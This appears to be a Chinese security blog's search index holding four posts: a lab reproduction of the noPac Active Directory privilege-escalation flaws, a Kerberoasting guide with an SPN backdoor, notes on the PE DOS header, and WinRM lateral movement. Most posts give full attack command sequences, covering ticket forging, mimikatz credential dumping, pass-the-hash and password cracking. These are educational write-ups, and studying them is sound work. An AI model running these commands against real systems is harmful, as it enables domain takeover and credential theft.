<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278分析复现</title>
    <url>/2022/03/01/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>距离漏洞披露已经过了许久，现在终于有些空余时间用于学习复现这两个漏洞。</p>
</blockquote>
<h3 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h3><ul>
<li>CVE-2021-42278，机器账户的名称一般用<code>$</code>结尾，但AD并未对域内机器账户名进行验证。</li>
<li>CVE-2021-42287， 结合上述42278漏洞，创建一个与DC机器账户名称相同的机器账户(不以$结尾)，使用该账户请求一个TGT后，修改账户名，然后通过S4U2Self申请TGS Ticket，然后DC进行在<code>TGS_REP</code>阶段加密<code>TGS Ticket</code>时，无法找到该账户利用机器账户hash加密，DC便使用自己的hash加密<code>TGS Ticket</code>，提供一个属于该账户的<code>PAC</code>，我们便可得到一个高权限的ST。</li>
</ul>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h3><ol>
<li>首先创建一个机器账户</li>
<li>清除机器账户的<code>servicePrincipalName</code>属性</li>
<li>将机器账户的<code>sAMAccountName</code>修改为DC的机器账户名，但不带$</li>
<li>使用机器账户的身份请求TGT</li>
<li>将机器账户的<code>sAMAccountName</code>修改为其他值，不能与DC的机器账户名重复。</li>
<li>通过S4U2Self向KDC申请ST</li>
<li>拿到高权限ST票据，完成利用。</li>
</ol>
<p>利用原理：如果域内存在一台域控名为DC(机器账户为DC$)的域控机，此时攻击者可利用CVE-2021-42287漏洞去申请一个机器账户，再将机器账户的<code>sAMAccountName</code>修改为DC。然后再利用这个机器账户去申请一个TGT票据，再将DC的<code>sAMAccountName</code>修改为其他。修改结束后再利用这个TGT通过S4U2Self去申请ST票据，此时KDC识别TGT票据内用户名为DC，检索到域内并未存在DC用户，但存在DC$用户(检索的依据为sAMAccountName值)，于是KDC通过DC机器的hash加密票据，我们便可成功拿到DC的权限。</p>
<span id="more"></span>

<h3 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h3><h4 id="手动实现"><a href="#手动实现" class="headerlink" title="手动实现"></a>手动实现</h4><h5 id="1-创建机器账户"><a href="#1-创建机器账户" class="headerlink" title="1.创建机器账户"></a>1.创建机器账户</h5><p>拿到域成员权限后，利用Powermad.ps1创建机器用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module Poweremad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount Nayon</span><br></pre></td></tr></table></figure>

<p>验证是否添加成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302184058328.png" alt="image-20220302184058328"></p>
<h5 id="2-擦除SPN记录信息"><a href="#2-擦除SPN记录信息" class="headerlink" title="2.擦除SPN记录信息"></a>2.擦除SPN记录信息</h5><p>注册机器账户后，会自动在<code>Nayon$</code>的名下注册SPN服务，此时我们需要擦除，免于影响我们接下来的操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainObject &quot;CN=Nayon,CN=Computers,DC=attack&quot;,DC=&quot;local&quot; #查看Nayon$用户下的信息</span><br><span class="line">Set-DomainObject &quot;CN=Nayon,CN=Computers,DC=attack,DC=local&quot; -Clear &#x27;serviceprincipalname&#x27; -Verbose #擦除SPN服务</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302224406626.png" alt="image-20220302224406626"></p>
<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302224910302.png" alt="image-20220302224910302"></p>
<p>此时已将记录清除。</p>
<h5 id="3-修改samaccountname伪造机器账户名"><a href="#3-修改samaccountname伪造机器账户名" class="headerlink" title="3.修改samaccountname伪造机器账户名"></a>3.修改<code>samaccountname</code>伪造机器账户名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount 机器账户名 -Value &quot;要伪造的机器账户名(无$)&quot; -Attribute</span><br><span class="line">samaccountname -Verbose</span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302225727545.png" alt="image-20220302225727545"></p>
<p>此时可以看到，我们的<code>Nayon$</code>用户，在修改了<code>samaccountname</code>值后，用户名已改为<code>DC</code>。</p>
<h5 id="4-申请TGT票据"><a href="#4-申请TGT票据" class="headerlink" title="4.申请TGT票据"></a>4.申请TGT票据</h5><p>由于知道机器账户的明文密码，我们可以直接使用Rubeus申请TGT票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:DC /password:******* /domain:attack.local /dc:attack.local /nowrap</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注: nowrap 选项，票据不换行，便于我们导出为文件</p>
</blockquote>
<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302231105438.png" alt="image-20220302231105438"></p>
<h5 id="5-再次修改samaccountname值"><a href="#5-再次修改samaccountname值" class="headerlink" title="5.再次修改samaccountname值"></a>5.再次修改<code>samaccountname</code>值</h5><p>将拿到的票据保存，并继续修改<code>Nayon$</code>用户的<code>samaccountname</code>，使其不为DC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount Nayon -Value &quot;Nayon&quot; -Attribute</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302231452272.png" alt="image-20220302231452272"></p>
<h5 id="6-借用DC用户的TGT去DC-的ST票据"><a href="#6-借用DC用户的TGT去DC-的ST票据" class="headerlink" title="6.借用DC用户的TGT去DC$的ST票据"></a>6.借用DC用户的TGT去DC$的ST票据</h5><p>利用Rubeus实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot;</span><br><span class="line">/altservice:&quot;cifs/dc.attack.local&quot; /dc:&quot;dc.attack.local&quot; /ptt</span><br><span class="line">/ticket:xxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302233836680.png" alt="image-20220302233836680"></p>
<p>此时已拥有访问dc的共享目录权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302234949690.png" alt="image-20220302234949690"></p>
<h4 id="自动化实现"><a href="#自动化实现" class="headerlink" title="自动化实现"></a>自动化实现</h4><p>使用noPac项目实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/cube0x0/noPac</span><br></pre></td></tr></table></figure>

<p>项目下载地址，需本地自行编译。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./noPac.exe -domain attack.local -user Webmanager -pass &#x27;Password@1!&#x27; /dc dc.attack.local</span><br><span class="line">/mAccount test /mPassword test0123 /service cifs /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303123150880.png" alt="image-20220303123150880"></p>
<h3 id="Psexec方式直接Getshell"><a href="#Psexec方式直接Getshell" class="headerlink" title="Psexec方式直接Getshell"></a>Psexec方式直接Getshell</h3><p>若要通过此方式获得shell，在前一步仅获得<code>cifs</code>服务的权限还不够，我们还需要申请拿到host服务的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\dc.attack.local cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303123319064.png" alt="image-20220303123319064"></p>
<h3 id="Dcsync拖取域内所有hash"><a href="#Dcsync拖取域内所有hash" class="headerlink" title="Dcsync拖取域内所有hash"></a>Dcsync拖取域内所有hash</h3><p>想要拖取域内hash，我们可以利用漏洞申请<code>ldap</code>服务的ST票据，PTT加载后，通过mimikatz申请</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./noPac.exe -domain attack.local -user Webmanager -pass &#x27;Password@1!&#x27; /dc dc.attack.local /mAccount test /mPassword test0123 /service ldap /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303124511355.png" alt="image-20220303124511355"></p>
<p>拿到hash后利用<code>Evil-Winrm</code>登陆域控<code>getshell</code>，当然，此处也可使用<code>impacket</code>套件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.165 -u Administrator -H &quot;dbf36575210cc5a38ab4050cc6a2e9aa&quot; </span><br></pre></td></tr></table></figure>



<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303125032356.png" alt="image-20220303125032356"></p>
<h3 id="关于漏洞修复"><a href="#关于漏洞修复" class="headerlink" title="关于漏洞修复"></a>关于漏洞修复</h3><ul>
<li>安装微软官方的:KB5008602、KB5008380补丁。</li>
<li>通过ADSI编辑器将AD域的MAQ配置为0，中断漏洞的利用链。</li>
</ul>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberoasting</title>
    <url>/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>​    <strong>Kerberoasting的概念</strong></p>
<p>​    <strong>Kerberoasting的原理</strong></p>
<p>​    <strong>Kerberoasting的实现</strong></p>
<p>​    <strong>Kerberoasting后门利用</strong></p>
<span id="more"></span>

<h2 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h2><h3 id="一、SPN是什么"><a href="#一、SPN是什么" class="headerlink" title="一、SPN是什么:"></a>一、<strong>SPN是什么:</strong></h3><p>服务主题名称( SPN: Service Principal Names) 是服务实例， 可以将其理解为一个服务（比如HTTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p>
<p>如果在整个域或林中的计算机上安装多个服务实例，则每个实例都必须有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例主机的名称，因此服务实例可以为其主机名称或别名注册SPN。如果想使用<strong>Kerberos</strong>协议进行认证服务，那必须正确配置SPN</p>
<h3 id="SPN分类"><a href="#SPN分类" class="headerlink" title="SPN分类:"></a><strong>SPN分类:</strong></h3><p><strong>1.注册在域内机器账户(computer)下</strong></p>
<p>当一个服务的权限为Local System 或 Network Service时，SPN会注册于域内机器账户下(Computers)</p>
<p><strong>注册在域内用户账户(User)下</strong></p>
<p>当一个服务的权限为一个域用户，则此时SPN注册在域用户账户下(Users)</p>
<h3 id="二、SPN标准格式"><a href="#二、SPN标准格式" class="headerlink" title="二、SPN标准格式"></a><strong>二、SPN标准格式</strong></h3><p>在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中和为必须元素:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt; accountname</span><br><span class="line">&lt;service class&gt; 	#标识服务类的字符串</span><br><span class="line">&lt;host&gt;	#服务所在主机名</span><br><span class="line">&lt;port&gt;	#服务端口</span><br><span class="line">&lt;service name&gt;	#服务名称</span><br><span class="line">accountname #注册账户名</span><br></pre></td></tr></table></figure>

<p>Serviceclass可以认为是服务名，常见的有www,ldap,http,dns等</p>
<p>host有两种形式，FQDN与NetBIOS名，例如Service1.redteam.com和service1</p>
<p>如果服务运行于默认端口上，可省略端口号</p>
<h3 id="三、查询SPN"><a href="#三、查询SPN" class="headerlink" title="三、查询SPN"></a>三、查询SPN</h3><p>利用setspn等手段对域控制器发起LDAP查询，是正常的Kerberos票据行为的一部分，因此很难被设备或筛选日志查询得到。</p>
<p><strong>1.使用SetSPN</strong></p>
<p>查看当前域内所有的SPN:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure>

<p>查看目标域内的SPN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -t redteam -q */*</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927155830466.png" alt="image-20210927155830466"></p>
<p>可以发现</p>
<p><strong>机器账户：</strong></p>
<ul>
<li><strong>CN=AD-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
<li><strong>CN=AD2-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
<li><strong>CN=WEB-2012,CN=Computers,DC=redteam,DC=com</strong></li>
<li><strong>CN=WEB-2003,CN=Computers,DC=redteam,DC=com</strong></li>
</ul>
<p><strong>域用户账户：</strong></p>
<ul>
<li><strong>CN=krbtgt,CN=Users,DC=redteam,DC=com</strong></li>
</ul>
<p><strong>注册于域用户下的SPN仅有一个：</strong></p>
<ul>
<li><strong>kadmin/changepw</strong></li>
</ul>
<h2 id="0x03-Kerberoasting的原理"><a href="#0x03-Kerberoasting的原理" class="headerlink" title="0x03 Kerberoasting的原理"></a>0x03 Kerberoasting的原理</h2><h3 id="一、-Kerberos认证过程"><a href="#一、-Kerberos认证过程" class="headerlink" title="一、 Kerberos认证过程"></a>一、 Kerberos认证过程</h3><ul>
<li>​    Kerberoasting 当域内某个用户去请求同域内的某个服务实例时，请求会首先被 送达至<strong>KDS</strong> 的 <strong>AS</strong> 中进行身份认证。</li>
<li>​    通过后 <strong>AS</strong> 会返回一个由用户密码<strong>hash</strong>加密而成的<strong>TGT</strong>票据给用户，然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过**(RC4_HMAC_MD5)<strong>的票据</strong>TGS**</li>
<li>​    用户拿着<strong>TGS</strong>通过目标服务实例验证后可以去访问对应的服务资源，<strong>Kerberoasting</strong>攻击利用TGS票据加密算法已知这一条件，尝试穷举口令，对<strong>TGS</strong>进行对比，若<strong>TGS</strong>相同，则口令正确。得到对应服务实例的明文密码。</li>
</ul>
<h3 id="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h3><p>设用户a需要访问Mysql服务，进行到**Ticket Granting Server(TGS)**返还TGS票据时：</p>
<p><strong>1.Domain Controller查询Mysql服务的SPN</strong></p>
<p>如果该SPN注册在机器账户(<strong>Computers</strong>)，将会查询所有机器账户(<strong>Computers</strong>)的servicePrincipalName属性，查找对应的账户</p>
<p>如果该SPN注册在域用户账户(<strong>Users</strong>)，将会查询所有域用户账户(<strong>Users</strong>)的servicePrincipalName属性，查找对应的账户</p>
<p>**2.**找到对应的账户后，使用该账户的NTLM Hash，生成TGS票据</p>
<p><strong>3、域内的主机都能查询SPN</strong></p>
<p><strong>4、域内的任何用户都可以向域内的任何服务请求TGS</strong></p>
<p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。</p>
<p>对于破解的明文口令，只有域用户账户(Users)的口令存在价值，不必考虑机器账户的口令(无法用于远程连接)</p>
<p>利用思路如下：</p>
<ol>
<li>查询SPN，找到有价值的SPN，需要满足如下条件    <ul>
<li>SPN注册在域用户账户下(Users)</li>
<li>域用户账户的权限很高</li>
</ul>
</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>利用字典破解TGS拿到明文密码</li>
</ol>
<h2 id="0x04-Kerberoasting的实现方法一"><a href="#0x04-Kerberoasting的实现方法一" class="headerlink" title="0x04 Kerberoasting的实现方法一"></a>0x04 Kerberoasting的实现方法一</h2><h3 id="1、拿到有价值的SPN"><a href="#1、拿到有价值的SPN" class="headerlink" title="1、拿到有价值的SPN"></a><strong>1、拿到有价值的SPN</strong></h3><ul>
<li>注册于域用户账户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
<p>1.<strong>使用Powershell模块Active Directory</strong></p>
<p>Actice Directory模块 需要提前安装，域控自带</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
<p>dll文件可在github上自行下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>

<p><strong>2.使用Powerview</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module Powerview.ps1</span><br><span class="line">Get-NetUser -spn -admincount | select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927164313999.png" alt="image-20210927164313999"></p>
<p><strong>3.利用Kerberoast</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>

<p>列出所有域用户SPN</p>
<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927165832743.png" alt="image-20210927165832743"></p>
<h3 id="3、请求TGS票据"><a href="#3、请求TGS票据" class="headerlink" title="3、请求TGS票据"></a>3、请求TGS票据</h3><p><strong>1、请求指定TGS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SPNName=&#x27;kadmin/changepw&#x27;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

<p><strong>2、请求所有TGS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | Select-String &#x27;^CN&#x27; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927170102406.png" alt="image-20210927170102406"></p>
<p>klist 查看内存中的票据，即可找到TGS</p>
<p><strong>3、导出</strong></p>
<p>使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>利用hashcat或kerberoast进行破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py 项目地址</span><br><span class="line">python2 tgsrepcrack.py password.txt  1-40a10000-administrator@kadmin~changepw-REDTEAM.COM.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoasting后门利用"><a href="#0x06-Kerberoasting后门利用" class="headerlink" title="0x06 Kerberoasting后门利用"></a>0x06 Kerberoasting后门利用</h2><p>当我们取得SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
<p>例如为域用户<strong>administrator</strong>添加SPN NC/dc.de1ay.com</p>
<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210928100158925.png" alt="image-20210928100158925"></p>
<p>此时为域内用户administrator添加了一个SPN，在域内任何一台主机上都可以获得本SPN，并能使用Kerberoast获得TGS</p>
<p>在后续需要使用时请求服务，获取TGS使用Hashcat破解即可</p>
<p>Ps:写这玩意犯困，困了我好多次呢= =</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-DOS头</title>
    <url>/2021/11/19/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4/</url>
    <content><![CDATA[<p>PE结构-DOS头，本部分为参照吾爱破解论坛lyl610abc师傅<a href="https://www.52pojie.cn/thread-1403011-1-1.html">PE文件笔记</a>所整理的学习笔记。</p>
<h3 id="DOS部首"><a href="#DOS部首" class="headerlink" title="DOS部首"></a>DOS部首</h3><h4 id="DOS部首结构"><a href="#DOS部首结构" class="headerlink" title="DOS部首结构"></a>DOS部首结构</h4><span id="more"></span>

<p><strong>其结构分为两部分:</strong></p>
<ol>
<li><strong>DOS ‘MZ’ HEADER</strong> 其在c中定义的结构体为_IMAGE_DOS_HEADER</li>
<li>DOS sub </li>
</ol>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119195942676.png" alt="image-20211119195942676"></p>
<h5 id="DOS-MZ头"><a href="#DOS-MZ头" class="headerlink" title="DOS MZ头"></a>DOS MZ头</h5><p>DOS MZ头在C语言中所定义的结构体为:</p>
<p>定义于<strong>winnt.h</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (r  elative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="分析-IMAGE-DOS-HEADER成员"><a href="#分析-IMAGE-DOS-HEADER成员" class="headerlink" title="分析_IMAGE_DOS_HEADER成员"></a>分析<code>_IMAGE_DOS_HEADER</code>成员</h4><p>DOS头的存在，是为了往下兼容在低版本DOS系统上运行，所以该部分主要用于DOS系统</p>
<p>目前在32/64位Windows操作系统中还有效的成员只有两个</p>
<ul>
<li>第一个成员:e_magic (WORD 2字节) 用于识别文件是否为PE格式文件 值固定为<strong>4d 5a (MZ)</strong></li>
<li>最后一个成员: e_lfanew (LONG 4字节)  存储PE头首地址 位于0x3c位置</li>
</ul>
<p>DOS部首中的其他值已经在现阶段Windows系统中弃用，下面通过将对应值置换为0，验证其无效性：</p>
<p>利用16进制编辑器打开Everedit.exe程序，将DOS部首除<strong>e_magic</strong>、<code>e_lfanew</code>之外的DOS部首成员选中清零</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119201606255.png" alt="image-20211119201606255"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119201720010.png" alt="image-20211119201720010"></p>
<p>另存为新文件后仍能正常使用，确认DOS部首其他值已在Windows平台弃用。</p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>WinRM-横向移动</title>
    <url>/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    <content><![CDATA[<p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
<p>假设我们已经获得一台内网服务器的管理员权限(对端服务器允许此用户登陆即可)，并且开启了WinRM管理服务器，那么我们可以利用凭证进行内网横向移动</p>
<span id="more"></span>

<p>开放端口5985的主机运行WInRM服务，可利用端口扫描工具进行探测确认。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV --open -p5985 <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span><span class="number">-12</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926195057008.png" alt="image-20210926195057008"></p>
<p>如果此时端口5985打开但端口5986已经被关闭，此时WinRM服务配置为仅接受HTTP连接，并加密</p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192658012.png" alt="image-20210926192658012"></p>
<p>利用Poershell Invoke-Command 可通过WinRM服务执行命令。</p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192711834.png" alt="image-20210926192711834"></p>
<p>同时我们还可利用 <strong>WinRM</strong> 远程执行Mimikatz来导出内存中的票据，无需将Mimikatz放入目标机器中执行。</p>
<p>此处使用Mimikatz导出票据，前提条件是你已获得管理员权限，否则将会导出失败。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Import-Module ./Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192725400.png" alt="image-20210926192725400"></p>
<p>利用导出的凭证，继续横向渗透。</p>
<p>对于不运行 <strong>WinRM</strong> 的系统，可以利用Powershell命令进行启用配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192736459.png" alt="image-20210926192736459"></p>
<p>默认情况下，可能无法通过 WinRM 连接到另一个系统， 并且可能需要额外的配置。 以下配置可能帮助我们解决配置错误问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Winrm quickconfig</span><br><span class="line">winrm set winrm/config/client @&#123;AllowUnencrypted = &quot;true</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>

<h2 id="WinRs"><a href="#WinRs" class="headerlink" title="WinRs"></a>WinRs</h2><p>WinRS 是一个命令行工具，它是Windows 2008及更高版本的一部分。如果启用了WinRM,此实用程序可用于远程执行主机上的命令。在CMD参数上可建立一个新的远程cmd会话。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192758398.png" alt="image-20210926192758398"></p>
<p>也可对其远程执行命令而非一个cmd会话，以便对目标远程探测</p>
